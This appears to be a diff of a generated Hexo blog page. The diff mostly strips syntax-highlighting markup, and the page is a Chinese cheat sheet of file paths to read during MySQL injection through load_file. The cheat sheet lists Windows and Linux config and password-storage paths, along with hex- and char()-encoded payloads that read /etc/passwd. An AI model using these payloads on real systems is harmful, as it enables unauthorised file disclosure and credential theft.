@@ -27,10 +27,9 @@
     <link rel="stylesheet" type="text/css" href="/css/matery.css">
     <link rel="stylesheet" type="text/css" href="/css/my.css">
 
-    <script src="/libs/jquery/jquery.min.js"></script>
+    <script src="/libs/jquery/jquery.min.js"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
 
-<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
-<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>
+</head>
 
 
 
@@ -525,7 +524,7 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="Windows下"><a href="#Windows下" class="headerlink" title="Windows下"></a>Windows下</h1><pre class="line-numbers language-bash"><code class="language-bash">c:/boot.ini //查看系统版本
+                <h1 id="Windows下"><a href="#Windows下" class="headerlink" title="Windows下"></a>Windows下</h1><pre><code class="bash">c:/boot.ini //查看系统版本
 
 c:/windows/php.ini //php配置信息
 
@@ -565,8 +564,8 @@ d:\APACHE\Apache2\conf\httpd.conf
 C:\Program Files\mysql\my.ini
 
 C:\mysql\data\mysql\user.MYD     
-//存储MYSQL系统中的用户密码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h1 id="Linux-Unix下"><a href="#Linux-Unix下" class="headerlink" title="Linux/Unix下"></a>Linux/Unix下</h1><pre class="line-numbers language-bash"><code class="language-bash">/usr/local/app/apache2/conf/httpd.conf //apache2缺省配置文件
+//存储MYSQL系统中的用户密码</code></pre>
+<h1 id="Linux-Unix下"><a href="#Linux-Unix下" class="headerlink" title="Linux/Unix下"></a>Linux/Unix下</h1><pre><code class="bash">/usr/local/app/apache2/conf/httpd.conf //apache2缺省配置文件
 
 /usr/local/apache2/conf/httpd.conf
 
@@ -606,12 +605,12 @@ C:\mysql\data\mysql\user.MYD
 /etc/sysconfig/iptables 
 //查看防火墙策略
 
-load_file<span class="token punctuation">(</span>char<span class="token punctuation">(</span>47<span class="token punctuation">))</span> 
+load_file(char(47)) 
 //可以列出FreeBSD,Sunos系统根目录
 
-replace<span class="token punctuation">(</span>load_file<span class="token punctuation">(</span>0×2F6574632F706173737764<span class="token punctuation">)</span>,0×3c,0×20<span class="token punctuation">)</span>
+replace(load_file(0×2F6574632F706173737764),0×3c,0×20)
 
-replace<span class="token punctuation">(</span>load_file<span class="token punctuation">(</span>char<span class="token punctuation">(</span>47,101,116,99,47,112,97,115,115,119,100<span class="token punctuation">))</span>,char<span class="token punctuation">(</span>60<span class="token punctuation">)</span>,char<span class="token punctuation">(</span>32<span class="token punctuation">))</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+replace(load_file(char(47,101,116,99,47,112,97,115,115,119,100)),char(60),char(32))</code></pre>
 <h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul>
 <li><a href="https://www.cnblogs.com/lcamry/p/5729087.html" target="_blank" rel="noopener">MySQL注入load_file常用路径</a></li>
 </ul>
@@ -1243,7 +1242,7 @@ replace<span class="token punctuation">(</span>load_file<span class="token punct
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">201k</span>&nbsp;字
+                class="white-color">207.6k</span>&nbsp;字
             
             
             
